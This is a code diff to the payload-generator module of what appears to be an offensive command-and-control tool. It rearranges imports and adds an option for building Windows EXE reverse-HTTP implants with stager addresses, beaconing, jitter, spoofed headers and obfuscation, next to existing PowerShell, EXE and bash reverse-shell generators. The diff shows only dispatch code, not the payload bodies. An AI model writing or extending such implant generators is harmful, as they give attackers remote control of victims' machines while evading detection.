@@ -4,19 +4,27 @@ import string
 import pyperclip
 import re
 from core.payload_generator.common import payload_utils as payutils
+
+# Windows TCP payloads
 from core.payload_generator.windows.tcp.ps1 import powershell_reverse_tcp
 from core.payload_generator.windows.tcp.exe import exe_reverse_tcp
 
+# Windows TLS payloads
 from core.payload_generator.windows.tls.exe import exe_reverse_tls
 from core.payload_generator.windows.tls.ps1 import powershell_reverse_tls
 
-from core.payload_generator.windows.http import powershell_reverse_http
+# Windows HTTP payloads
+from core.payload_generator.windows.http.exe import exe_reverse_http
+from core.payload_generator.windows.http.ps1 import powershell_reverse_http
+
+# Windows HTTPS payloads
 from core.payload_generator.windows.https import powershell_reverse_https
 
 from core.payload_generator.linux.tcp import bash_reverse_tcp
 from core.payload_generator.linux.http import bash_reverse_http
-from colorama import init, Fore, Style
 
+# Colorama settings
+from colorama import init, Fore, Style
 brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
 brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
 brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
@@ -51,6 +59,10 @@ def generate_payload_windows(ip, port, obs, format_type, payload_type, beacon_in
     elif payload_type == "http":
         if format_type == "ps1":
             raw = powershell_reverse_http.generate_windows_powershell_http(ip, port, obs, beacon_interval, headers, useragent, accept=accept, byte_range=byte_range, jitter=jitter, no_child=None, profile=profile)
+
+        elif format_type == "exe":
+            raw = exe_reverse_http.generate_exe_reverse_http(ip, port, obs, beacon_interval, headers, useragent, stager_ip, stager_port,
+                accept=accept, byte_range=byte_range, jitter=jitter, profile=profile)
 
     elif payload_type == "https":
         if format_type == "ps1":
